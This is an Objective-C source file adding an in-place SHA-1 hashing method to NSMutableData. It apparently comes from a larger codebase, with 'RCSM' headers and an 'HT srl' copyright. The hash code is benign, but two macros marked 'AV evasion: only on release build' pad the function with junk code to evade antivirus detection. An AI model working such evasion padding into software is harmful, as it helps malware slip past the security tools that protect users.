/*
 * NSMutableData Category
 *  Provides in-place hashing
 *
 * 
 * Created by Alfredo 'revenge' Pesoli on 24/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <CommonCrypto/CommonDigest.h>
#import <openssl/sha.h>

#import "NSMutableData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation NSMutableData (SHA1Extension)

- (NSMutableData *)sha1Hash
{
  unsigned char digest[SHA_DIGEST_LENGTH]; 
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
 	CC_SHA1([self bytes], [self length], digest);
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
 	return [NSMutableData dataWithBytes: &digest length: SHA_DIGEST_LENGTH];
}

@end